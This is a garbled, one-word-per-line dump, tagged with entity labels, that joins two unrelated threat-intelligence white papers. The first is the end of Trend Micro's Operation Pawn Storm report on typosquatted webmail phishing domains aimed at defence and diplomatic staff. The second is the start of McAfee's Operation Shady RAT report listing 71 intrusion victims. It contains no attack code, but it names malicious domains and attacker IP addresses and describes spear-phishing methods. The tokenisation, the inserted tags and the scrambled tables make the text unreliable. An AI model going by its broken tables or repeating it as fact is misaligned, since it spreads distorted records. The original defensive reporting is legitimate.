:
mail
.
hm
.
qov
.
hu
•
Real
OWA
domain
:
mail.hm.gov.hu

The
attackers
created
a
domain
that
was
very
similar
to
eurosatory . com
[
14
]
,
a
website
for
an
international
land
and
air-land
defense
and
security
exhibition
.

They
then
sent
emails
with
the
link
,
http
:
//
eurosatory2014.com B_url.normal
,
to
selected
employees
of
the
target
defense
ministry
who
might
actually
have
been
expecting
to
hear
from
the
conference
staff

11

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

members
.

Clicking
the
link
embedded
in
the
email
via
the
OWA
preview
pane
opens
the
real
conference
website
in
a
new
tab
.

The
victims
'
OWA
session
in
the
other
tab
,
meanwhile
,
is
redirected
to
a
phished
log-in
page
that
makes
it
look
like
the
session
has
ended
.

'Closed
'
OWA
session
page
(
fake
)
victims
will
see
,
forcing
them
to
reenter
their
credentials

In
reality
,
the
victims
'
OWA
session
did
not
end
.

The
previously
mentioned
JavaScript
just
redirected
them
to
a
fake
OWA
login
page
that
looks
just
like
the
Ministry
of
Defense
in
Hungary
's
real
one
.

Apart
from
'EUROSATORY
2014
,
'
other
conferences
were
also
used
to
target
employees
of
the
Ministry
of
Defense
in
Hungary
as
shown
in
the
following
table
.

Real
'EUROSATORY
2014
'
conference
website
opens
in
a
new
tab
after
clicking
the
link
in
a
spear-phishing
email
viewed
in
OWA

Similar
Attacks
Against
the
Ministry
of
Defense
,
Hungary

Conference

Target
Domain

Malicious
Domain

'Africa
Aerospace
and
Defence
2014
'

'The
10th
Special
Operations
Forces
Exhibition
&
Conference
'

aadexpo.co.za B_url.normal

aadexpo2014.co.za B_url.cncsvr

sofexjordan.com B_url.normal

sofexjordan2014.com B_url.cncsvr

'ITEC
'

itec.co.uk B_url.normal

itec2014.co.uk B_url.cncsvr

12

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

CASE
2
:
OSCE
,
AUSTRIA

•
Malicious
news
domain
:

vice-news.com B_url.cncsvr

•
Real
news
domain

:
news.vice.com B_url.normal

•
Phished
OWA
domain
:

log-in-osce.org B_url.cncsvr

•
Real
OWA
domain
:
log-in.osce.org B_url.normal

This
attack
targeted
OSCE
employees
in
Austria
.

Although
the
attackers
used
similar
tactics
,
they
did
not
spoof
a
conference
website
.

They
instead
used
a
fake
version
of
the
news
website
,
news.vice.com B_url.normal
.

•
Real
conference
domain
:

natoexhibition.org B_url.normal

•
Phished
OWA
domain
:
webmail-saic.com B_url.cncsvr
•
Real
OWA
domain
:
webmail.saic.com B_url.normal

This
attack
targeting
SAIC
was
very
similar
to
the
first
case
.

The
attackers
spoofed
the
website
of
the
'Future
Forces
2014
'
conference
to
trick
email
recipients
into
handing
over
their
webmail
credentials
.

Comparison
of
the
legitimate
(
top
)
and
spoofed
(
bottom
)
OWA
log-in
pages
of
OSCE

Comparison
of
the
legitimate
(
top
)
and
spoofed
(
bottom
)
OWA
log-in
pages
of
SAIC

Even
though
OSCE
provides
better
security
for
webmail
users
compared
with
the
other
targets
via
one-time
session
token
use
during
log-in
,
attackers
can
still
steal
highly
sensitive
data
from
victims
by
hijacking
a
single
session
.

CASE
3
:
SAIC
,
UNITED
STATES

•
Malicious
conference
domain
:

natoexhibitionff14.com B_url.cncsvr

CASE
4
:
ACADEMI

•
Malicious
news
domain
:
tolonevvs.com B_url.cncsvr

•
Real
news
domain
:
tolonews.com B_url.normal

•
Phished
OWA
domain
:
academl.com B_url.cncsvr

•
Real
OWA
domain
:
academi.com B_url.normal

13

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

This
attack
targeted
the
employees
of
U.S.
defense
contractor
,
ACADEMI
,
using
the
same
phishing
tactics
as
in
the
second
case
.

Apart
from
the
four
specific
cases
presented
above
,
evidence
pointing
to
a
fake
OWA
server
for
a
multinational
company
based
in
Germany
was
also
discovered
.

The
threat
actors
registered
a
domain
that
looked
very
similar
to
the
target
's
real
domain
and
purchased
a
Secure
Sockets
Layer
(
SSL
)
certificate
for
the
fake
domain
as
part
of
preparations
for
a
targeted
attack
.

Trend
Micro
was
able
to
warn
the
target
early
on
,
which
helped
thwart
the
threat
.

Other
Webmail
Services

OWA
users
are
not
the
only
ones
at
risk
though
,
as
the
threat
actors
behind
Operation
Pawn B_malware.infosteal
Storm I
also
targeted
users
of
free
webmail
services
such
as
GmailTM
,
Live
Mail
,
Yahoo
!
®
,
Hushmail
,
and
Yandex
.

Comparison
of
the
legitimate
(
top
)
and
spoofed
(
bottom
)
OWA
log-in
pages
of
ACADEMI

14

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Sample
Gmail
,
Live
Mail
,
Hushmail
,
and
Yandex
account
phishing
websites

We
leaked
specific
credentials
to
the
threat
actors
in
a
couple
of
cases
to
see
if
the
fake
webmail
service
log-in
pages
were
indeed
intended
for
attack
use
.

Within
minutes
of
leaking
the
test
credentials
,
unauthorized
log-ins
were
recorded
.

The
first
log-in
was
usually
an
automated
login
check
from
the
same
IP
address
as
the
phishing
website
's
owner
.

The
succeeding
log-ins
were
made
from
the
IP
addresses
,
46.166.162.90 B_ip.unknown
(
Latvia
)
and
192.154.110.244 B_ip.unknown
(
United
States
)
,
via
Internet
Message
Access
Protocol
(
IMAP
)
.

No
other
forms
of
abuse
such
as
sending
spam
via
the
compromised
accounts
were
witnessed
.

This
showed
that
the
attackers
were
indeed
trying
to
obtain
sensitive
data
from
their
targets
instead
of
using
their
accounts
for
fraud
and
other
financially
motivated
scams
.

15

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

CONCLUSION

Operation
Pawn B_malware.infosteal
Storm I
used
next-level
spear-phishing
tactics
to
obtain
the
email
credentials
of
primarily
military
,
embassy
,
and
defense
contractor
personnel
from
the
United
States
and
its
allies
.

The
threat
actors
used
a
mix
of
spear-phishing
emails
and
specially
crafted
webmail
service
phishing
websites
to
gain
access
to
victims
'
inboxes
in
hopes
of
getting
better
footholds
inside
target
organizations
.

So
as
not
to
raise
suspicion
,
the
attackers
used
well-known
events
and
conferences
as
social
engineering
bait
.

They
have
been
quite
persistent
as
well
,
as
we
have
seen
evidence
that
attacks
have
been
going
on
since
2007
.

Apart
from
effective
phishing
tactics
,
the
threat
actors
used
a
combination
of
proven
targeted
attack
staples
to
compromise
systems
and
get
in
to
target
networks—
exploits
and
data-stealing
malware
.

SEDNIT B_malware.backdoor
variants
particularly
proved
useful
,
as
these
allowed
the
threat
actors
to
steal
all
manners
of
sensitive
information
from
the
victims
'
computers
while
effectively
evading
detection
.

Trend
Micro
has
notified
the
targets
that
have
been
identified
in
this
paper
.

Individuals
and
their
respective
organizations
,
meanwhile
,
should
use
solutions
that
can
help
protect
against
the
various
attack
vectors
that
the
threat
actors
behind
Operation
Pawn B_malware.infosteal
Storm I
used
.

Messaging
security
solutions
such
as
Trend
MicroTM
InterScanTM
Messaging
Security
[
15
]
and
the
ScanMailTM
Suite
for
Microsoft
Exchange
[
16
]
can
send
suspicious
email
attachments
to
a
sandbox
for
analysis
,
thus
protecting
recipients
from
threats
.

Other
products
such
as
OfficeScanTM
[
17
]
for
endpoints
and
InterScan
Web
Security
Virtual
Appliance
[
18
]
for
gateways
can
also
block
user
access
to
known
phishing
sites
.

For
overall
protection
against
targeted
attacks
,
Trend
MicroTM
Deep
Discovery
[
19
]
can
help
protect
potential
targets
by
sandboxing
and
analyzing
suspicious
attachments
to
identify
phishing
emails
via
Email
Inspector
.

Via
360-degree
monitoring
of
network
traffic
to
get
networkwide
visibility
and
intelligence
,
Deep
Discovery
allows
users
to
detect
and
respond
to
targeted
attacks
and
advanced
threats
.

It
also
monitors
all
ports
and
more
than
80
protocols
,
giving
users
the
broadest
protection
available
.

Even
more
,
specialized
detection
engines
and
custom
sandboxing
help
identify
and
analyze
malware
,
C
&
C
communications
,
and
evasive
attacker
activities
that
are
invisible
to
standard
security
solutions
.

Along
with
in-depth
threat
intelligence
,
it
allows
for
rapid
response
and
automatic
sharing
with
other
security
products
to
create
real-time
custom
defense
against
attacks
.

16

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

REFERENCES

[
1
]
Trend
Micro
Incorporated
.

(
2014
)
.

Threat
Encyclopedia
.

'SEDNIT B_malware.backdoor
.
'

Last
accessed
October
13
,
2014
,
http://about-threats.trendmicro.com/us/search.aspx?p=SEDNIT B_url.normal
.

[
2
]
Symantec
Corporation
.

(
1995‒2014
)
.

Symantec
.

'Infostealer.Sofacy
.
'

Last
accessed
October
17
,
2014
,
http://www.symantec.com/security_response/writeup.jsp?docid=2011-090714-2907-99&tabid=2 B_url.normal
.

[
3
]
Trend
Micro
Incorporated
.

(
2014
)
.

Threat
Encyclopedia
.

'BKDR_SEDNIT.AE
.
'

Last
accessed
October
13
,
2014
,
http://about-threats.trendmicro.com/us/malware/BKDR_SEDNIT.AE B_url.normal
.

[
4
]
Trend
Micro
Incorporated
.

(
2014
)
.

Threat
Encyclopedia
.

'BKDR_SEDNIT.SM
.
'

Last
accessed
October
13
,
2014
,
http://about-threats.trendmicro.com/us/malware/BKDR_SEDNIT.SM B_url.normal
.

[
5
]
Trend
Micro
Incorporated
.

(
2014
)
.

Threat
Encyclopedia
.

'TROJ_SEDNIT
.

TOK
.
'

Last
accessed
October
13
,
2014
,
http://about-threats.trendmicro.com/us/malware/TROJ_SEDNIT.TOK B_url.normal
.

[
6
]
Wikimedia
Foundation
Inc
.

(
March
16
,
2014
)
.

Wikipedia
.

'Pawn B_malware.infosteal
Storm I
.
'

Last
accessed
October
21
,
2014
,
http://en.wikipedia.org/wiki/Pawn_storm B_url.normal
.

[
7
]
The
MITRE
Corporation
.

(
1999–2014
)
.

CVE
.

'CVE-2010-3333
.
'

Last
accessed
October
16
,
2014
,
http://cve.mitre.org/cgibin/cvename.cgi?name=CVE-2010-3333 B_url.normal
.

[
8
]
Trend
Micro
Incorporated
.

(
2014
)
.

Threat
Encyclopedia
.

'TROJ_ARTIEF
.
'

Last
accessed
October
21
,
2014
,
http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TROJ_ARTIEF B_url.normal
.

[
9
]
Post
Staff
.

(
January
9
,
2012
)
.

New
York
Post
.

'Three
Car
Bombs
Explode
in
Iraq
,
Killing
17
.
'

Last
accessed
October
16
,
2014
,
http://nypost.com/2012/01/09/three-car-bombs-explode-in-iraq-killing-17/ B_url.normal
.

[
10
]
The
MITRE
Corporation
.

(
1999–
2014
)
.

CVE
.

'CVE-2012-0158
.
'

Last
accessed
October
16
,
2014
,
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158 B_url.normal
.

[
11
]
IQPC
.

(
2014
)
.

Homeland
Security
Summit
Middle
East
.

'Towards
Total
Preparedness
:
Advancing
Command
and
Control
and
Communication
for
Increased
Identification
,
Access
,
Surveillance
,
Cyber
Protection
Capabilities
.
'

Last
accessed
October
16
,
2014
,
http://www.homelandsecurityme.com/ B_url.normal
.

[
12
]
Malware
@
prevenity
.

(
September
11
,
2014
)
.

'mht
,
MS12-27
oraz
*malware*.info
.
'

Last
accessed
October
16
,
2014
,
http://malware.prevenity.com/2014/08/malware-info.html B_url.normal
.

[
13
]
R136a1
.

(
December
27
,
2012
)
.

Analyzing
Unknown
Malware
.

'
#
3
Disclosure
of
Another
0-Day
Malware—
Update
and
Additional
Information
.
'

Last
accessed
October
17
,
2014
,
http://thegoldenmessenger.blogspot.ro/2012/12/3-disclosure-of-another-0day-malware_27.html B_url.normal
.

[
14
]
COGES
.

(
2013
)
.

EUROSATORY
2014
.

'The
Largest
International
Land
and
AirLand
Defence
and
Security
Exhibition
.
'

Last
accessed
October
17
,
2014
,
http://www.eurosatory.com/ B_url.normal
.

[
15
]
Trend
Micro
Incorporated
.

(
2014
)
.

Trend
Micro
.

'InterScan
Messaging
Security
.
'

Last
accessed
October
21
,
2014
,
http://www.trendmicro.com/us/enterprise/network-security/interscan-message-17 B_url.normal

Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

security/ I
.

[
16
]
Trend
Micro
Incorporated
.

(
2014
)
.

Trend
Micro
.

'ScanMail
Suite
for
Microsoft
Exchange
.
'

Last
accessed
October
21
,
2014
,
http://www.trendmicro.com/us/enterprise/network-web-messaging-security/scanmail-microsoft-exchange/ B_url.normal
.

[
17
]
Trend
Micro
Incorporated
.

(
2014
)
.

Trend
Micro
.

'OfficeScan—Endpoint
Protection
.
'

Last
accessed
October
22
,
2014
,
http://www.trendmicro.com/us/enterprise/product-security/officescan/ B_url.normal
.

[
18
]
Trend
Micro
Incorporated
.

(
2014
)
.

Trend
Micro
.

'InterScan
Web
Security
Virtual
Appliance
.
'

Last
accessed
October
22
,
2014
,
http://www.trendmicro.com/us/enterprise/network-security/interscan-web-security/virtual-appliance/ B_url.normal
.

[
19
]
Trend
Micro
Incorporated
.

(
2014
)
.

Trend
Micro
.

'Deep
Discovery
Advanced
Network
Security
.
'

Last
accessed
October
21
,
2014
,
http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/ B_url.normal
.

18
Trend
Micro
|
Operation
Pawn B_malware.infosteal
Storm I

Trend
Micro
Incorporated
,
a
global
leader
in
security
software
,
strives
to
make
the
world
safe
for
exchanging
digital
information
.

Our
innovative
solutions
for
consumers
,
businesses
and
governments
provide
layered
content
security
to
protect
information
on
mobile
devices
,
endpoints
,
gateways
,
servers
and
the
cloud
.

All
of
our
solutions
are
powered
by
cloud-based
global
threat
intelligence
,
the
Trend
MicroTM
Smart
Protection
NetworkTM
,
and
are
supported
by
over
1,200
threat
experts
around
the
globe
.

For
more
information
,
visit
www.trendmicro.com B_url.normal
.

©2014
by
Trend
Micro
,
Incorporated
.

All
rights
reserved
.

Trend
Micro
and
the
Trend
Micro
t-ball
logo
are
trademarks
or
registered
trademarks
of
Trend
Micro
,
Incorporated
.

All
other
product
or
company
names
may
be
trademarks
or
registered
trademarks
of
their
owners
.

225
E
.

John
Carpenter
Freeway
,
Suite
1500Irving
,
Texas
75062
U.S.A.Phone
:
+1.817.569,8900
White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

By
Dmitri
Alperovitch
,
Vice
President
,
Threat
Research
,
McAfee

An
investigation
of
targeted
intrusions
into
more
than
70
global
companies
,
governments
,
and
non-profit
organizations
during
the
last
five
years

Version
1.1

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

For
the
last
few
years
,
especially
since
the
public
revelation
of
Operation
Aurora
,
the
targeted
successful
intrusion
into
Google
and
two
dozen
other
companies
,
I
have
often
been
asked
by
our
worldwide
customers
if
they
should
worry
about
such
sophisticated
penetrations
themselves
or
if
that
is
a
concern
only
for
government
agencies
,
defense
contractors
,
and
perhaps
Google
.

My
answer
in
almost
all
cases
has
been
unequivocal
:
absolutely
.

Having
investigated
intrusions
such
as
Operation
Aurora
and
NightDragon
(
the
systemic
long-term
compromise
of
Western
oil
and
gas
industry
)
,
as
well
as
numerous
others
that
have
not
been
disclosed
publicly
,
I
am
convinced
that
every
company
in
every
conceivable
industry
with
significant
size
and
valuable
intellectual
property
and
trade
secrets
has
been
compromised
(
or
will
be
shortly
)
,
with
the
great
majority
of
the
victims
rarely
discovering
the
intrusion
or
its
impact
.

In
fact
,
I
divide
the
entire
set
of
Fortune
Global
2,000
firms
into
two
categories
:
those
that
know
they
've
been
compromised
and
those
that
do
n't
yet
know
.

Lately
,
with
the
rash
of
revelations
about
attacks
on
organizations
such
as
RSA
,
Lockheed
Martin
,
Sony
,
PBS
,
and
others
,
I
have
been
asked
by
surprised
reporters
and
customers
whether
the
rate
of
intrusions
is
increasing
and
if
it
is
a
new
phenomenon
.

I
find
the
question
ironic
because
these
types
of
exploitations
have
occurred
relentlessly
for
at
least
a
half
decade
,
and
the
majority
of
the
recent
disclosures
in
the
last
six
months
have
,
in
fact
,
been
a
result
of
relatively
unsophisticated
and
opportunistic
exploitations
for
the
sake
of
notoriety
by
loosely
organized
political
hacktivist
groups
such
as
Anonymous
and
Lulzsec
.

On
the
other
hand
,
the
targeted
compromises
we
are
focused
on
—
known
as
advanced
persistent
threats
(
APTs
)
—
are
much
more
insidious
and
occur
largely
without
public
disclosures
.

They
present
a
far
greater
threat
to
companies
and
governments
,
as
the
adversary
is
tenaciously
persistent
in
achieving
their
objectives
.

The
key
to
these
intrusions
is
that
the
adversary
is
motivated
by
a
massive
hunger
for
secrets
and
intellectual
property
;
this
is
different
from
the
immediate
financial
gratification
that
drives
much
of
cybercrime
,
another
serious
but
more
manageable
threat
.

What
we
have
witnessed
over
the
past
five
to
six
years
has
been
nothing
short
of
a
historically
unprecedented
transfer
of
wealth
—
closely
guarded
national
secrets
(
including
those
from
classified
government
networks
)
,
source
code
,
bug
databases
,
email
archives
,
negotiation
plans
and
exploration
details
for
new
oil
and
gas
field
auctions
,
document
stores
,
legal
contracts
,
supervisory
control
and
data
acquisition
(
SCADA
)
configurations
,
design
schematics
,
and
much
more
has
'fallen
off
the
truck
'
of
numerous
,
mostly
Western
companies
and
disappeared
in
the
ever-growing
electronic
archives
of
dogged
adversaries
.

2

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

What
is
happening
to
all
this
data
—
by
now
reaching
petabytes
as
a
whole
—
is
still
largely
an
open
question
.

However
,
if
even
a
fraction
of
it
is
used
to
build
better
competing
products
or
beat
a
competitor
at
a
key
negotiation
(
due
to
having
stolen
the
other
team
's
playbook
)
,
the
loss
represents
a
massive
economic
threat
not
just
to
individual
companies
and
industries
but
to
entire
countries
that
face
the
prospect
of
decreased
economic
growth
in
a
suddenly
more
competitive
landscape
and
the
loss
of
jobs
in
industries
that
lose
out
to
unscrupulous
competitors
in
another
part
of
the
world
.

And
let
's
not
forget
the
national
security
impact
of
the
loss
of
sensitive
intelligence
or
defense
information
.

Yet
,
the
public
(
and
often
the
industry
)
understanding
of
this
significant
national
security
threat
is
largely
minimal
due
to
the
very
limited
number
of
voluntary
disclosures
by
victims
of
intrusion
activity
compared
to
the
actual
number
of
compromises
that
take
place
.

With
the
goal
of
raising
the
level
of
public
awareness
today
,
we
are
publishing
the
most
comprehensive
analysis
ever
revealed
of
victim
profiles
from
a
five-year
targeted
operation
by
one
specific
actor
—
'Operation
Shady B_malware.drop
RAT I
,
'
as
I
have
named
it
at
McAfee
(
RAT
is
a
common
acronym
in
the
industry
that
stands
for
remote
access
tool
)
.

This
is
not
a
new
attack
,
and
the
vast
majority
of
the
victims
have
long
since
remediated
these
specific
infections
(
although
whether
most
realized
the
seriousness
of
the
intrusion
or
simply
cleaned
up
the
infected
machine
without
further
analysis
into
the
data
loss
is
an
open
question
)
.

McAfee
has
detected
the
malware
variants
and
other
relevant
indicators
for
years
with
Generic
Downloader.x
and
Generic
BackDoor.t
heuristic
signatures
(
those
who
have
had
prior
experience
with
this
specific
adversary
may
recognize
it
by
the
use
of
encrypted
HTML
comments
in
web
pages
that
serve
as
a
command
channel
to
the
infected
machine
)
.

McAfee
has
gained
access
to
one
specific
command
and
control
(
C
&
C
)
server
used
by
the
intruders
.

We
have
collected
logs
that
reveal
the
full
extent
of
the
victim
population
since
mid-2006
when
the
log
collection
began
.

Note
that
the
actual
intrusion
activity
may
have
begun
well
before
that
time
,
but
that
is
the
earliest
evidence
we
have
for
the
start
of
the
compromises
.

The
compromises
themselves
were
standard
procedure
for
these
types
of
targeted
intrusions
:
a
spear-phishing
email
containing
an
exploit
is
sent
to
an
individual
with
the
right
level
of
access
at
the
company
,
and
the
exploit
,
when
opened
,
on
an
unpatched
system
will
trigger
a
download
of
the
implant
malware
.

That
malware
will
execute
and
initiate
a
backdoor
communication
channel
to
the
C
&
C
web
server
and
interpret
the
instructions
encoded
in
the
hidden
comments
embedded
in
the
webpage
code
.

This
will
be
quickly
followed
by
live
intruders
jumping
on
to
the
infected
machine
and
proceeding
to
quickly
escalate
privileges
and
move
laterally
within
the
organization
to
establish
new
persistent
footholds
via
additional
compromised
machines
running
implant
malware
,
as
well
as
targeting
for
quick
exfiltration
the
key
data
they
came
for
.

After
painstaking
analysis
of
the
logs
,
even
we
were
surprised
by
the
enormous
diversity
of
the
victim
organizations
and
were
taken
aback
by
the
audacity
of
the
perpetrators
.

Although
we
will
refrain
from
explicitly
identifying
most
of
the
victims
,
describing
only
their
general
industry
,
we
feel
that
naming
names
is
warranted
in
certain
cases
,
not
with
the
goal
of
attracting
attention
to
a
specific
victim
organization
,
but
to
reinforce
the
fact
that
virtually
everyone
is
falling
prey
to
these
intrusions
,
regardless
of
whether
they
are
the
United
Nations
,
a
multinational
Fortune
100
company
,
a
small
,
non-profit
think
tank
,
a
national
Olympic
team
,
or
even
an
unfortunate
computer
security
firm
.

3

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

In
all
,
we
identified
71
compromised
parties
(
many
more
were
present
in
the
logs
but
without
sufficient
information
to
accurately
identify
them
)
.

Of
these
,
the
breakdown
of
32
unique
organization
categories
follows
:

21

6

13

13

6

12

Construction/
Heavy
Industry

Steel
Industry

Energy

Solar
Power

3

1

1

1

Electronics
Industry

Computer
Security

Information
Technology

Satellite
Communications

News
Media

Information
Services

Communications
Technology

3

2

2

2

2

1

1

Defense
Contractor

1

3

Real
Estate

Accounting
Industry

Agriculture

Insurance

2

2

1

1

International
Sports

Economics/
Trade

Think
Tanks

International
Government/
Economics/
Trade

Political
Non-Profit

US
National
Security
Non-Profit

5

2

2

1

1

1

6

5

3

2

1

1

1

1

1

US
Federal
Government

US
State
Government

US
County
Government

Canadian
Government

Vietnam
Government

Taiwan
Government

US
Government

Contractor
United
Nations

Indian
Government

Source
:
McAfee

4

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

And
for
those
who
believe
these
compromises
occur
only
in
the
United
States
,
Canada
,
and
Europe
,
allow
me
to
change
that
perception
with
the
following
statistics
on
14
geographic
locations
of
the
targets
:

Victim
's
Country
of
Origin

Victim
Count

Victim
's
Country
of
Origin

Victim
Count

USA

Canada

South
Korea

Taiwan

Japan

Switzerland

United
Kingdom

Source
:
McAfee

49

4

2

3

2

2

2

Indonesia

Vietnam

Denmark

Singapore

Hong
Kong

Germany

India

1

1

1

1

1

1

1

5

49

1

2

2

1

1

2

1

3

1

1

1

2

4

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

The
interest
in
the
information
held
at
the
Asian
and
Western
national
Olympic
Committees
,
as
well
as
the
International
Olympic
Committee
(
IOC
)
and
the
World
Anti-Doping
Agency
in
the
lead-up
and
immediate
follow-up
to
the
2008
Olympics
was
particularly
intriguing
and
potentially
pointed
a
finger
at
a
state
actor
behind
the
intrusions
,
because
there
is
likely
no
commercial
benefit
to
be
earned
from
such
hacks
.

The
presence
of
political
non-profits
,
such
as
a
private
western
organization
focused
on
promotion
of
democracy
around
the
globe
or
a
US
national
security
think
tank
is
also
quite
illuminating
.

Hacking
the
United
Nations
or
the
Association
of
Southeast
Asian
Nations
(
ASEAN
)
Secretariat
is
also
not
likely
a
motivation
of
a
group
interested
only
in
economic
gains
.

Another
fascinating
aspect
that
the
logs
have
revealed
to
us
is
the
changing
tasking
orders
of
the
perpetrators
as
the
years
have
gone
by
.

In
2006
,
the
year
that
the
logs
begin
,
we
saw
only
eight
intrusions
:
two
on
South
Korean
steel
and
construction
companies
and
one
each
on
a
Department
of
Energy
Research
Laboratory
,
a
US
real
estate
firm
,
international
trade
organizations
of
Asian
and
Western
nations
and
the
ASEAN
Secretariat
.

(
That
last
intrusion
began
in
October
,
a
month
prior
to
the
organization
's
annual
summit
in
Singapore
,
and
continued
for
another
10
months
.
)

In
2007
,
the
pace
of
activity
jumped
by
a
whopping
260
percent
to
a
total
of
29
victim
organizations
.

That
year
we
began
to
see
new
compromises
of
no
fewer
than
four
US
defense
contractors
,
Vietnam
's
government-owned
technology
company
,
US
federal
government
agency
,
several
US
state
and
county
governments
,
and
one
computer
network
security
company
.

The
compromises
of
the
Olympic
Committees
of
two
nations
in
Asia
and
one
Western
country
began
that
year
as
well
.

In
2008
,
the
count
went
up
further
to
36
victims
,
including
the
United
Nations
and
the
World
Anti-Doping
Agency
,
and
to
38
in
2009
.

Then
the
number
of
intrusions
fell
to
17
in
2010
and
to
9
in
2011
,
likely
due
to
the
widespread
availability
of
the
countermeasures
for
the
specific
intrusion
indicators
used
by
this
specific
actor
.

These
measures
caused
the
perpetrator
to
adapt
and
increasingly
employ
a
new
set
of
implant
families
and
C
&
C
infrastructure
(
causing
activity
to
disappear
from
the
logs
we
analyzed
)
.

Even
news
media
was
not
immune
to
the
targeting
,
with
one
major
US
news
organization
compromised
at
its
New
York
headquarters
and
Hong
Kong
bureau
for
more
than
21
months
.

The
shortest
time
that
an
organization
remained
compromised
was
less
than
a
single
month
;
nine
share
that
honor
:
International
Olympic
Committee
(
IOC
)
,
Vietnam
's
government-owned
technology
company
,
a
trade
organization
of
a
nation
in
Asia
,
one
Canadian
government
agency
,
one
US
defense
contractor
,
one
US
general
government
contractor
,
one
US
state
and
one
county
government
,
and
a
US
accounting
firm
.

I
must
,
however
,
caution
that
this
may
not
necessarily
be
an
indication
of
the
rapid
reaction
of
information
security
teams
in
those
organizations
,
but
perhaps
merely
evidence
that
the
actor
was
interested
only
in
a
quick
smash
and
grab
operation
that
did
not
require
a
persistent
compromise
of
the
victim
.

The
longest
compromise
was
recorded
at
an
Olympic
Committee
of
a
nation
in
Asia
;
it
lasted
on
and
off
for
28
months
,
finally
terminating
in
January
2010
.

6

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Below
is
the
complete
list
of
all
71
targets
,
with
country
of
origin
,
start
date
of
the
initial
compromise
and
duration
of
the
intrusions
:

Victim

South
Korean
Construction
Company

South
Korean
Steel
Company

Country
Intrusion

South
Korea

South
Korea

Department
of
Energy
Research
Laboratory

USA

Start
Date

July
2006

July
2006

July
2006

Trade
Organization

Country
in
Asia

July
2006

US
International
Trade
Organization

ASEAN
(
Association
of
Southeast
Asian
Nations
)
Secretariat

USA

Indonesia

September
2006

October
2006

US
Real-Estate
Firm
#
1

USA

November
2006

Vietnam
's
Government-owned
Technology
Company

Vietnam

March
2007

US
Real-Estate
Firm
#
2

US
Defense
Contractor
#
1

US
Defense
Contractor
#
2

US
Northern
California
County
Government

US
Southern
California
County
Government

US
State
Government
#
1

US
Federal
Government
Agency
#
1

USA

USA

USA

USA

USA

USA

USA

April
2007

May
2007

May
2007

June
2007

June
2007

July
2007

July
2007

Olympic
Committee
of
Asian
Country
#
1

Country
in
Asia

July
2007

US
State
Government
#
2

US
State
Government
#
3

US
Federal
Government
Agency
#
2

USA

USA

USA

August
2007

August
2007

August
2007

Olympic
Committee
of
Western
Country

Western
Country

August
2007

Taiwanese
Electronics
Company

US
Federal
Government
Agency
#
3

US
Federal
Government
Agency
#
4

Taiwan

USA

USA

September
2007

September
2007

September
2007

Western
Non-Profit
,
Democracy-Promoting
Organization

Western
Country

September
2007

Olympic
Committee
of
Asian
Country
#
2

Country
in
Asia

September
2007

International
Olympic
Committee

Switzerland

November
2007

US
Defense
Contractor
#
3

US
Network
Security
Company

US
Defense
Contractor
#
4

USA

USA

USA

November
2007

December
2007

December
2007

Intrusion
Duration
(
Months
)

17

11

3

1

12

10

8

1

17

21

20

7

24

6

8

28

1

25

7

7

8

4

8

4

7

1

7

3

7

7

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Victim

US
Accounting
Firm

US
Electronics
Company

Country
Intrusion

USA

USA

Start
Date

January
2008

February
2008

UK
Computer
Security
Company

United
Kingdom

February
2008

US
National
Security
Think
Tank

US
Defense
Contractor
#
5

US
Defense
Contractor
#
6

US
State
Government
#
4

Taiwan
Government
Agency

US
Government
Contractor
#
1

US
Information
Technology
Company

US
Defense
Contractor
#
7

US
Construction
Company
#
1

US
Information
Services
Company

Canadian
Information
Technology
Company

US
National
Security
Non-Profit

USA

USA

USA

USA

Taiwan

USA

USA

USA

USA

USA

Canada

USA

February
2008

February
2008

February
2008

April
2008

April
2008

April
2008

April
2008

April
2008

May
2008

May
2008

July
2008

July
2008

Denmark
Satellite
Communications
Company

Denmark

August
2008

United
Nations

Switzerland

September
2008

Singapore
Electronics
Company

Singapore

November
2008

UK
Defense
Contractor

United
Kingdom

January
2009

US
Satellite
Communications
Company

US
Natural
Gas
Wholesale
Company

US
Nevada
County
Government

US
State
Government
#
5

US
Agricultural
Trade
Organization

US
Construction
Company
#
2

US
Communications
Technology
Company

US
Defense
Contractor
#
8

US
Defense
Contractor
#
9

US
Defense
Contractor
#
10

US
News
Organization
,
Headquarters

USA

USA

USA

USA

USA

USA

USA

USA

USA

USA

USA

US
News
Organization
,
Hong
Kong
Bureau

Hong
Kong

US
Insurance
Association

World
Anti-Doping
Agency

German
Accounting
Firm

USA

Canada

Germany

February
2009

March
2009

April
2009

April
2009

May
2009

May
2009

May
2009

May
2009

May
2009

June
2009

August
2009

August
2009

August
2009

August
2009

September
2009

Intrusion
Duration
(
Months
)

1

13

6

20

9

2

2

8

1

7

16

19

6

4

8

6

20

4

12

25

7

1

3

3

4

7

4

3

11

8

21

3

14

10

8

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Victim

US
Solar
Power
Energy
Company

Canadian
Government
Agency
#
1

US
Government
Organization
#
5

US
Defense
Contractor
#
11

US
Defense
Contractor
#
12

Canadian
Government
Agency
#
2

US
Think
Tank

Indian
Government
Agency

Country
Intrusion

Start
Date

Intrusion
Duration
(
Months
)

USA

Canada

USA

USA

USA

Canada

USA

India

September
2009

October
2009

November
2009

December
2009

December
2009

January
2010

April
2010

September
2010

4

6

2

2

1

1

13

2

Below
are
the
complete
timelines
for
each
year
of
intrusion
activity
.

It
could
be
an
interesting
exercise
to
map
some
of
these
specific
compromises
to
various
geopolitical
events
that
occurred
around
these
times
.

(
The
gaps
in
the
timelines
for
continuous
infections
